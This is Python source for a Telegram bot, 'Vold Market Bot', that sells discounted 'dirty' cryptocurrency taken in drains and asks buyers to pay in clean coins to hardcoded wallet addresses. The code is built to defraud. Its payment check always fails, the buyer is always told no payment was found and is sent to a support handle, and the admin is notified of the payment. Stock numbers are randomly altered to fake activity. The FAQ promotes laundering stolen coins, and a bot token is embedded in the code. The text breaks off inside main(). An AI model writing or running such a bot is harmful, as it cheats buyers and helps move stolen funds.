#!/usr/bin/env python3
"""Vold Market Bot – English only, persistent data, interactive admin panel, manual stock control, giveaway, ban system."""

import asyncio
import json
import logging
import os
import random
from typing import Dict, Set

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode, ChatMemberStatus
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ==================== CONFIG ====================
BOT_TOKEN = "8929119049:AAECELNoFRLd5fyY_thieXasxz0K9kthtt8"
ADMIN_ID = 8745164587
SUPPORT_USERNAME = "@reuvensh"
CHANNEL_USERNAME = "@voldmarket"
VOUCHES_USERNAME = "@voldvouches"
BOT_USERNAME = "@voldmarket_bot"

CRYPTO_ADDRESSES = {
    "BTC": "bc1qudvjwuugrtkthdlwq76j0eam6lel8hcurf3rj5",
    "ETH": "0xebfd3EDFCD40F5D739043f7482e0946Ff0afA4E3",
    "SOL": "HkgiBjVHMkgAPbBu71hVQb3zBv8zmrM1pQvwjodYedcr",
    "LTC": "ltc1q578p84ulz63l83ce467lcunjusp2zd7gpcazf2",
    "BNB": "0xebfd3EDFCD40F5D739043f7482e0946Ff0afA4E3",
    "USDT_TRC20": "TPc4mnpRSETfY9yofenXLmf2GD6qGZnzwa",
    "XMR": "48hjiNMpfpQ8BfLe1Hy6P7MxZM4WXvXLggAdc3Er4Pzs6W5dDYStBzzKB9VWcBCNZHDuoexKTT9HJYoCR1GZX6Qs4M7a3YW",
}

DATA_FILE = "vold_data.json"

# ==================== PERSISTENCE ====================
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            data = json.load(f)
        all_users_set = set(data.get("users", []))
        referral_tree_dict = {int(k): int(v) for k, v in data.get("ref_tree", {}).items()}
        referral_count_dict = {int(k): v for k, v in data.get("ref_count", {}).items()}
        tiers = data.get("multipliers", None)
        saved_stock = data.get("stock", {"ETH": 87471.0, "BTC": 51785.0})
        giveaway_participants_set = set(data.get("giveaway_participants", []))
        user_info_dict = {int(k): v for k, v in data.get("user_info", {}).items()}
        banned_users_set = set(data.get("banned_users", []))
        return (all_users_set, referral_tree_dict, referral_count_dict, tiers, saved_stock,
                giveaway_participants_set, user_info_dict, banned_users_set)
    return (set(), {}, {}, None, {"ETH": 87471.0, "BTC": 51785.0}, set(), {}, set())

def save_data():
    data = {
        "users": list(all_users),
        "ref_tree": {str(k): v for k, v in referral_tree.items()},
        "ref_count": {str(k): v for k, v in referral_count.items()},
        "multipliers": list(MULTIPLIER_TIERS),
        "stock": STOCK,
        "giveaway_participants": list(giveaway_participants),
        "user_info": user_info,
        "banned_users": list(banned_users),
    }
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

# Initialisation des variables globales
(all_users, referral_tree, referral_count, saved_tiers, saved_stock,
 giveaway_participants, user_info, banned_users) = load_data()

if saved_tiers is not None:
    MULTIPLIER_TIERS = [(low, high, mult) for low, high, mult in saved_tiers]
else:
    MULTIPLIER_TIERS = [
        (50, 199.99, 2.5),
        (200, 499.99, 3.0),
        (500, 999.99, 3.5),
        (1000, float("inf"), 4.0),
    ]

STOCK = saved_stock

PRICE = {
    "BTC": 64180.26,
    "ETH": 1872.69,
    "SOL": 74.02,
    "LTC": 44.83,
    "BNB": 592.89,
    "USDT_TRC20": 1.0,
    "XMR": 360.70,
}

# ==================== TRANSLATIONS ====================
T = {
    "start": (
        "🤖 *Vold Market Bot*\n"
        "Official bot of @voldmarket\n\n"
        "Buy discounted crypto with a risky history.\n"
        "Choose an option:"
    ),
    "buy": "💰 Buy Crypto",
    "referral": "👥 Referral",
    "rates": "📊 Rates",
    "faq": "❓ FAQ",
    "tos": "📝 TOS",
    "support": "🛡️ Support",
    "channel": "📢 Channel",
    "vouches": "✅ Vouches",
    "referral_info": (
        "👥 *Referral Program*\n\n"
        "Invite your friends! You will receive 30% of your referrals spending on the bot and you'll be notified when someone joins through your link.\n\n"
        "Your referral link:\n"
        "`https://t.me/{}?start=ref{}`\n\n"
        "People you referred: *{}*\n\n"
        "Share the link. When someone starts the bot through it, you'll receive a notification automatically."
    ),
    "buy_prompt": "How much do you want to pay (USD)?\nMinimum: $40",
    "invalid_amount": "❌ Invalid amount. Enter a number >= 40.",
    "stock_error": "❌ Sorry, we don't have enough stock for that amount. Available stock: *${:,.0f}* in {} .",
    "choose_receive_coin": "Which coin do you want to **receive** (dirty)?",
    "receive_estimate": (
        "You pay: *${:.2f}*\n"
        "Multiplier: *x{}*\n"
        "You will receive: *${:.2f}* worth of *{}*\n"
        "That's approximately *{:.6f} {}*\n\n"
        "Now enter your *{}* address where you want to receive the dirty coins:"
    ),
    "invalid_address": "⚠️ Invalid address. Please enter a valid {} address.",
    "choose_payment_method": "Great! Now choose the cryptocurrency you want to **pay with** (clean funds):",
    "payment_instruction": (
        "Send exactly *{:.6f} {}* to:\n"
        "`{}`\n\n"
        "This is equivalent to *${:.2f}* USD.\n"
        "After sending, click the button below."
    ),
    "i_paid": "✅ I have paid",
    "cancel": "❌ Cancel",
    "back": "🔙 Back",
    "checking_payment": "⏳ Checking for your payment...",
    "no_payment": (
        "❌ No payment detected yet.\n"
        "New check in 60 seconds. You can cancel the transaction below."
    ),
    "payment_found_contact": (
        "❌ Payment not detected!\n"
        "Please contact {} to finalize your dirty coins delivery."
    ),
    "admin_notify": (
        "🤑 *New payment notification!*\n"
        "User: @{}\n"
        "Amount: ${:.2f} / {:.6f} {}\n"
        "Receives: {:.6f} {} (dirty)\n"
        "Receive address: `{}`"
    ),
    "admin_notify_ref": (
        "🤑 *New payment notification!*\n"
        "User: @{}\n"
        "Referred by: @{}\n"
        "Amount: ${:.2f} / {:.6f} {}\n"
        "Receives: {:.6f} {} (dirty)\n"
        "Receive address: `{}`"
    ),
    "referrer_join_notify": "🎉 Someone just joined using your referral link!",
    "referral_join_info": "You were invited by a friend. You'll be added to their referral list.",
    "support_text": "For any questions, contact {}",
    "tos_text": """📝 *Terms Of Services*
1. Transaction: All trades are final. Prices are indicative and may change.
2. Risk: Coins carry a risk of being flagged or frozen. We are not responsible.
3. Liability: We are not liable for any losses, legal issues, or technical problems.
4. Clean funds only: We only accept clean funds. Dirty funds will be refunded.
5. Changes: Terms may be updated anytime.""",
    "faq_text": """❓ *FAQ*
Q: Why are the coins cheaper?
A: They have a risky history – Drain, call etc. That risk justifies the discount.

Q: How do I buy?
A: Use the bot or message @reuvensh. You'll get a deposit address.

Q: Minimum?
A: $40 equivalent. No maximum.

Q: Why don't you clean the coins yourselves?
A: Cleaning large amounts takes time and spreads risk. We sell at a discount and let buyers handle cleaning. It's faster for us and still a good deal.

Q: Middleman?
A: Yes, middleman accepted at your fees.

Q: Delivery time?
A: Usually under 30 minutes.

Q: Anonymity?
A: We don't ask for personal info. Your privacy depends on your own setup.

Q: What if coins get frozen?
A: Once sent, it's out of our control. Use a new non‑KYC wallet.

Q: How to clean?
A: Guide provided with purchase.""",
    "flash_sale_message": "🔥 Flash Sales: Bonus +$100 for 1h! 🔥",
    "stats_text": (
        "📊 *Bot Statistics*\n"
        "Total users: {}\n"
        "Referral participants: {}\n"
        "Total referral links used: {}\n"
        "Giveaway participants: {}"
    ),
    "top_referrers_title": "🏆 *Top Referrers*\n\n",
    "top_referrers_entry": "{}. {} – {} referrals\n",
    "giveaway_join_channel": "⚠️ You must join @voldmarket to participate in the giveaway.",
    "giveaway_entry_recorded": "✅ Entry recorded! You now have *{}* entries.",
    "giveaway_already_entered": "ℹ️ You are already entered. You have *{}* entries.",
    "giveaway_compute_entries": "{} entry from joining + {} from referrals = *{}* total",
    "rates_header": "📊 *Current Multiplier Tiers*\n\n",
    "admin_panel": "🛠️ *Admin Panel*\nChoose an action:",
    "rates_updated": "✅ Multiplier tiers updated.",
    "rates_reset": "✅ Multiplier tiers reset to default.",
    "invalid_tier_input": "❌ Invalid tier format. Please enter: low high multiplier",
    "help_text": (
        "🛠️ *Admin Commands*\n\n"
        "/admin – Open interactive admin panel\n"
        "/stats – Show bot statistics\n"
        "/top – Show top referrers\n"
        "/dmall [message] – Send a broadcast message to all users (optional custom message)\n"
        "/setrates <low> <high> <mult> – Add or update a multiplier tier\n"
        "/setstock <ETH|BTC> <value> – Manually set the available stock for a coin\n"
        "/ban <user_id> – Ban a user from the bot\n"
        "/unban <user_id> – Unban a user\n"
        "/help – Show this help"
    ),
    "stock_updated": "✅ Stock for {} set to ${:,.2f}",
    "stock_usage": "Usage: /setstock <ETH|BTC> <value>",
    "stock_invalid_coin": "❌ Unknown coin. Use ETH or BTC.",
    "user_banned": "🚫 You are banned from using this bot.",
    "ban_success": "✅ User {} has been banned.",
    "unban_success": "✅ User {} has been unbanned.",
    "unban_not_found": "User {} is not banned.",
    "ban_usage": "Usage: /ban <user_id>",
    "unban_usage": "Usage: /unban <user_id>",
}

# ==================== GLOBALS ====================
pending_checks: Dict[int, asyncio.Task] = {}

# ==================== HELPERS ====================
def t(key: str, *args) -> str:
    return T[key].format(*args)

def get_multiplier(amount: float) -> float:
    for low, high, mult in MULTIPLIER_TIERS:
        if low <= amount <= high:
            return mult
    return 1.0

def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(T["buy"], callback_data="buy")],
        [InlineKeyboardButton(T["referral"], callback_data="referral")],
        [InlineKeyboardButton(T["rates"], callback_data="rates")],
        [InlineKeyboardButton(T["faq"], callback_data="faq")],
        [InlineKeyboardButton(T["tos"], callback_data="tos")],
        [InlineKeyboardButton(T["support"], callback_data="support")],
        [InlineKeyboardButton(T["channel"], url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [InlineKeyboardButton(T["vouches"], url=f"https://t.me/{VOUCHES_USERNAME[1:]}")],
    ])

def admin_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 View Rates", callback_data="admin_view_rates")],
        [InlineKeyboardButton("➕ Add Tier (use /setrates)", callback_data="admin_add_tier")],
        [InlineKeyboardButton("❌ Delete Last Tier", callback_data="admin_del_tier")],
        [InlineKeyboardButton("🔄 Reset Default", callback_data="admin_reset_rates")],
        [InlineKeyboardButton("📢 DMALL", callback_data="admin_dmall")],
        [InlineKeyboardButton("📈 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Close Panel", callback_data="admin_close")],
    ])

def save_and_log():
    save_data()
    logging.info("Data saved.")

def is_user_banned(user_id: int) -> bool:
    return user_id in banned_users

# ==================== STOCK UPDATER ====================
async def stock_updater():
    while True:
        for coin in ("ETH", "BTC"):
            STOCK[coin] = round(max(0.0, STOCK[coin] + random.uniform(-3000, 3000)), 2)
        save_and_log()
        logging.info(f"Stocks updated: ETH={STOCK['ETH']}, BTC={STOCK['BTC']}")
        await asyncio.sleep(30 * 60)

# ==================== GIVEAWAY LOGIC ====================
def compute_entries(user_id: int) -> int:
    base = 1 if user_id in giveaway_participants else 0
    refs = referral_count.get(user_id, 0)
    bonus = refs // 2
    return base + bonus

async def process_giveaway_entry(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> str:
    """Common giveaway entry logic: checks channel membership, registers user, returns message."""
    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        status = str(chat_member.status).lower()
        logging.info(f"Giveaway check for {user_id}: status={status}")
        if status not in ("creator", "administrator", "member", "restricted"):
            return T["giveaway_join_channel"]
    except Exception as e:
        logging.error(f"Giveaway membership check error: {e}")
        return "⚠️ An error occurred while verifying channel membership. Please try again later."

    if user_id not in giveaway_participants:
        giveaway_participants.add(user_id)
        save_and_log()
        entries = compute_entries(user_id)
        ref_count = referral_count.get(user_id, 0)
        msg = t("giveaway_entry_recorded", entries) + "\n" + \
              t("giveaway_compute_entries", 1, ref_count // 2, entries)
    else:
        entries = compute_entries(user_id)
        msg = t("giveaway_already_entered", entries)
    return msg

# ==================== HANDLERS ====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    # Vérification du bannissement
    if is_user_banned(user_id):
        await update.message.reply_text(T["user_banned"])
        return

    # Enregistrer l'utilisateur et son nom
    if user_id not in all_users:
        all_users.add(user_id)
        username = update.effective_user.username or update.effective_user.first_name or str(user_id)
        user_info[str(user_id)] = username
        save_and_log()

    # Gestion du deep link (giveaway / parrainage)
    if update.message and update.message.text:
        args = update.message.text.split()
        if len(args) > 1:
            if args[1].startswith("ref"):
                try:
                    referrer_id = int(args[1][3:])
                except:
                    referrer_id = None
                if referrer_id and referrer_id != user_id and referrer_id in all_users:
                    referral_tree[user_id] = referrer_id
                    referral_count[referrer_id] = referral_count.get(referrer_id, 0) + 1
                    save_and_log()
                    try:
                        await context.bot.send_message(referrer_id, T["referrer_join_notify"])
                    except:
                        pass
                    await update.message.reply_text(T["referral_join_info"])
            elif args[1] == "giveaway":
                msg = await process_giveaway_entry(update, context, user_id)
                await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    # Vérification du bannissement
    if is_user_banned(user_id):
        await query.answer(T["user_banned"], show_alert=True)
        return

    if data == "rates":
        text = T["rates_header"]
        for low, high, mult in MULTIPLIER_TIERS:
            text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
        text += f"\n💰 *Available stock*: ETH ${STOCK['ETH']:,.0f}, BTC ${STOCK['BTC']:,.0f}"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
    elif data == "faq":
        await query.edit_message_text(T["faq_text"], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
    elif data == "tos":
        await query.edit_message_text(T["tos_text"], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
    elif data == "support":
        await query.edit_message_text(t("support_text", SUPPORT_USERNAME), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]))
    elif data == "referral":
        count = referral_count.get(user_id, 0)
        text = t("referral_info", BOT_USERNAME, user_id, count)
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
    elif data == "back":
        await cmd_start(update, context)

# ==================== BUY CONVERSATION ====================
AMOUNT, COIN_RECEIVE, ADDRESS_RECEIVE, PAYMENT_METHOD, PAYMENT = range(5)

async def buy_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Vérification du bannissement
    if is_user_banned(user_id):
        await query.answer(T["user_banned"], show_alert=True)
        return ConversationHandler.END

    await query.edit_message_text(T["buy_prompt"])
    return AMOUNT

async def amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text.strip()
    try:
        amount = float(text)
        if amount < 40:
            raise ValueError
    except ValueError:
        await update.message.reply_text(T["invalid_amount"])
        return AMOUNT
    context.user_data["pay_amount"] = amount
    context.user_data["multiplier"] = get_multiplier(amount)
    keyboard = [
        [InlineKeyboardButton("BTC", callback_data="receive_BTC")],
        [InlineKeyboardButton("ETH", callback_data="receive_ETH")],
        [InlineKeyboardButton(T["cancel"], callback_data="cancel")],
    ]
    await update.message.reply_text(T["choose_receive_coin"], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    return COIN_RECEIVE

async def coin_receive(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "cancel":
        await query.edit_message_text("Purchase cancelled.")
        await cmd_start(update, context)
        return ConversationHandler.END
    coin = query.data.split("_")[1]
    context.user_data["receive_coin"] = coin
    pay_amount = context.user_data["pay_amount"]
    multiplier = context.user_data["multiplier"]
    receive_value = pay_amount * multiplier

    if coin in STOCK and receive_value > STOCK[coin]:
        await query.edit_message_text(
            t("stock_error", STOCK[coin], coin),
            parse_mode=ParseMode.MARKDOWN,
        )
        await cmd_start(update, context)
        return ConversationHandler.END

    context.user_data["receive_value"] = receive_value
    dirty_price = PRICE[coin]
    dirty_amount = receive_value / dirty_price
    context.user_data["dirty_amount"] = dirty_amount
    await query.edit_message_text(
        t("receive_estimate", pay_amount, multiplier, receive_value, coin, dirty_amount, coin, coin),
        parse_mode=ParseMode.MARKDOWN,
    )
    return ADDRESS_RECEIVE

async def receive_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    address = update.message.text.strip()
    coin = context.user_data["receive_coin"]
    valid = False
    if coin == "BTC":
        if address.startswith(("1", "3", "bc1")) and 26 <= len(address) <= 62:
            valid = True
    elif coin == "ETH":
        if address.startswith("0x") and len(address) == 42:
            valid = True
    if not valid:
        await update.message.reply_text(t("invalid_address", coin))
        return ADDRESS_RECEIVE
    context.user_data["receive_address"] = address
    payment_methods = ["BTC", "ETH", "SOL", "LTC", "BNB", "USDT_TRC20", "XMR"]
    keyboard = []
    for p in payment_methods:
        label = p if p != "USDT_TRC20" else "USDT (TRC-20)"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"paymethod_{p}")])
    keyboard.append([InlineKeyboardButton(T["cancel"], callback_data="cancel")])
    await update.message.reply_text(T["choose_payment_method"], reply_markup=InlineKeyboardMarkup(keyboard))
    return PAYMENT_METHOD

async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "cancel":
        await query.edit_message_text("Purchase cancelled.")
        await cmd_start(update, context)
        return ConversationHandler.END
    pay_coin = query.data.split("_")[1]
    context.user_data["pay_coin"] = pay_coin
    pay_amount = context.user_data["pay_amount"]
    price = PRICE.get(pay_coin, 1.0)
    crypto_amount = pay_amount / price if price else 0
    context.user_data["pay_crypto_amount"] = crypto_amount
    address = CRYPTO_ADDRESSES[pay_coin]
    text = t("payment_instruction", crypto_amount, pay_coin, address, pay_amount)
    keyboard = [
        [InlineKeyboardButton(T["i_paid"], callback_data="check_payment")],
        [InlineKeyboardButton(T["cancel"], callback_data="cancel")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    return PAYMENT

async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    pay_coin = context.user_data["pay_coin"]
    expected = context.user_data["pay_crypto_amount"]
    pay_amount = context.user_data["pay_amount"]
    receive_coin = context.user_data["receive_coin"]
    dirty_amount = context.user_data["dirty_amount"]
    receive_address = context.user_data["receive_address"]

    # Notification admin
    referrer_id = referral_tree.get(user_id)
    if referrer_id:
        try:
            referrer_chat = await context.bot.get_chat(referrer_id)
            referrer_name = referrer_chat.username or str(referrer_id)
        except:
            referrer_name = str(referrer_id)
        admin_text = t("admin_notify_ref",
                       query.from_user.username or user_id,
                       referrer_name,
                       pay_amount, expected, pay_coin,
                       dirty_amount, receive_coin,
                       receive_address)
    else:
        admin_text = t("admin_notify",
                       query.from_user.username or user_id,
                       pay_amount, expected, pay_coin,
                       dirty_amount, receive_coin,
                       receive_address)
    await context.bot.send_message(ADMIN_ID, admin_text, parse_mode=ParseMode.MARKDOWN)

    # Mise à jour du message utilisateur avec gestion d'erreur
    try:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(T["cancel"], callback_data="cancel")]])
        await query.edit_message_text(T["no_payment"], reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Failed to edit message after payment check: {e}")
        try:
            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(T["cancel"], callback_data="cancel")]])
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=T["no_payment"],
                reply_markup=keyboard,
            )
        except Exception as e2:
            logging.error(f"Could not send new payment message: {e2}")

    # Planifier une revérification après 60 secondes
    if user_id in pending_checks:
        pending_checks[user_id].cancel()
    task = asyncio.create_task(recheck_payment_after_delay(
        context.bot, user_id, query.message.chat_id, query.message.message_id,
        pay_coin, expected,
    ))
    pending_checks[user_id] = task
    return PAYMENT

async def recheck_payment_after_delay(bot, user_id, chat_id, message_id,
                                      pay_coin, expected):
    try:
        await asyncio.sleep(60)
        paid = await verify_payment(pay_coin, CRYPTO_ADDRESSES[pay_coin], expected)
        if paid:
            await bot.edit_message_text(
                t("payment_found_contact", SUPPORT_USERNAME),
                chat_id=chat_id, message_id=message_id,
            )
        else:
            await bot.edit_message_text(
                t("payment_found_contact", SUPPORT_USERNAME),
                chat_id=chat_id, message_id=message_id,
            )
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logging.error(f"Error during recheck: {e}")
    finally:
        if user_id in pending_checks:
            del pending_checks[user_id]

async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id in pending_checks:
        pending_checks[user_id].cancel()
        del pending_checks[user_id]

    try:
        await query.edit_message_text("Purchase cancelled.")
    except Exception:
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Purchase cancelled."
        )

    await cmd_start(update, context)
    return ConversationHandler.END

async def verify_payment(crypto: str, address: str, expected: float) -> bool:
    return False

# ==================== GIVEAWAY COMMAND ====================
async def cmd_giveaway(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text(T["user_banned"])
        return
    msg = await process_giveaway_entry(update, context, user_id)
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# ==================== ADMIN COMMANDS ====================
async def cmd_top(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    sorted_refs = sorted(referral_count.items(), key=lambda x: x[1], reverse=True)
    top = sorted_refs[:10]
    if not top:
        await update.message.reply_text("No referrals yet.")
        return

    text = T["top_referrers_title"]
    for i, (uid, count) in enumerate(top, start=1):
        name = user_info.get(str(uid))
        if not name:
            try:
                chat = await context.bot.get_chat(uid)
                name = chat.username or chat.first_name or str(uid)
                user_info[str(uid)] = name
                save_and_log()
            except Exception:
                name = str(uid)
        text += t("top_referrers_entry", i, name, count)
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    total_refs = len(referral_tree)
    total_links = sum(referral_count.values())
    giveaway_count = len(giveaway_participants)
    await update.message.reply_text(
        t("stats_text", len(all_users), total_refs, total_links, giveaway_count),
        parse_mode=ParseMode.MARKDOWN,
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(T["help_text"], parse_mode=ParseMode.MARKDOWN)

# ==================== BAN COMMANDS ====================
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text(T["ban_usage"])
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID.")
        return
    banned_users.add(target)
    save_and_log()
    await update.message.reply_text(t("ban_success", target))

async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text(T["unban_usage"])
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID.")
        return
    if target in banned_users:
        banned_users.remove(target)
        save_and_log()
        await update.message.reply_text(t("unban_success", target))
    else:
        await update.message.reply_text(t("unban_not_found", target))

# ==================== ADMIN PANEL ====================
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(T["admin_panel"], reply_markup=admin_menu(), parse_mode=ParseMode.MARKDOWN)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("Access denied.")
        return

    if data == "admin_view_rates":
        text = T["rates_header"]
        for low, high, mult in MULTIPLIER_TIERS:
            text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")]]))
    elif data == "admin_add_tier":
        await query.edit_message_text("Use /setrates <low> <high> <mult> to add or update a tier.",
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
    elif data == "admin_del_tier":
        if MULTIPLIER_TIERS:
            removed = MULTIPLIER_TIERS.pop()
            save_and_log()
            await query.edit_message_text(f"Last tier removed: {removed}",
                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
        else:
            await query.edit_message_text("No tiers to delete.",
                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
    elif data == "admin_reset_rates":
        MULTIPLIER_TIERS.clear()
        MULTIPLIER_TIERS.extend([
            (50, 199.99, 2.5),
            (200, 499.99, 3.0),
            (500, 999.99, 3.5),
            (1000, float("inf"), 4.0),
        ])
        save_and_log()
        await query.edit_message_text(T["rates_reset"],
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
    elif data == "admin_dmall":
        await query.edit_message_text("Use /dmall <message> to broadcast.",
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
    elif data == "admin_stats":
        total_refs = len(referral_tree)
        total_links = sum(referral_count.values())
        giveaway_count = len(giveaway_participants)
        text = t("stats_text", len(all_users), total_refs, total_links, giveaway_count)
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
    elif data == "admin_close":
        await query.edit_message_text("Admin panel closed.")
    elif data == "admin_back":
        await query.edit_message_text(T["admin_panel"], reply_markup=admin_menu(), parse_mode=ParseMode.MARKDOWN)

# ==================== OTHER COMMANDS ====================
async def cmd_dmall(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if context.args:
        message = " ".join(context.args)
    else:
        message = T["flash_sale_message"]
    success = 0
    for uid in all_users:
        if uid in banned_users:
            continue
        try:
            await context.bot.send_message(uid, message, parse_mode=ParseMode.MARKDOWN)
            success += 1
        except Exception as e:
            logging.warning(f"Could not DMALL to {uid}: {e}")
    await update.message.reply_text(f"DMALL sent to {success}/{len(all_users)} users.")

async def cmd_setrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args or len(context.args) != 3:
        await update.message.reply_text(T["invalid_tier_input"])
        return
    try:
        low = float(context.args[0])
        high = float(context.args[1])
        mult = float(context.args[2])
    except ValueError:
        await update.message.reply_text(T["invalid_tier_input"])
        return
    replaced = False
    for i, (l, h, m) in enumerate(MULTIPLIER_TIERS):
        if l == low:
            MULTIPLIER_TIERS[i] = (low, high, mult)
            replaced = True
            break
    if not replaced:
        MULTIPLIER_TIERS.append((low, high, mult))
        MULTIPLIER_TIERS.sort(key=lambda x: x[0])
    save_and_log()
    await update.message.reply_text(T["rates_updated"])

async def cmd_setstock(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args or len(context.args) != 2:
        await update.message.reply_text(T["stock_usage"])
        return
    coin = context.args[0].upper()
    try:
        value = float(context.args[1])
    except ValueError:
        await update.message.reply_text(T["stock_usage"])
        return
    if coin not in STOCK:
        await update.message.reply_text(T["stock_invalid_coin"])
        return
    STOCK[coin] = value
    save_and_log()
    await update.message.reply_text(t("stock_updated", coin, value))

# ==================== MAIN ====================
async def on_startup(app: Application):
    asyncio.create_task(stock_updater())
    logging.info("Bot started and data loaded.")

def main() -> None:
    logging.basicConfig(level=logging.INFO)
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(buy_start, pattern="^buy$")],
        states={
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, amount_input)],
            COIN_RECEIVE: [CallbackQueryHandler(coin_receive, pattern="^(receive_|cancel)")],
            ADDRESS_RECEIVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_address)],
            PAYMENT_METHOD: [CallbackQueryHandler(payment_method, pattern="^(paymethod_|cancel)")],
            PAYMENT: [
                CallbackQueryHandler(check_payment, pattern="^check_payment$"),
                CallbackQueryHandler(cancel_buy, pattern="^cancel$"),
            ],
        },
        fallbacks=[CallbackQueryHandler(cancel_buy, pattern="^cancel$")],
    )
    app.add_handler(conv_handler)

    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^(referral|rates|faq|tos|support|back)$"))
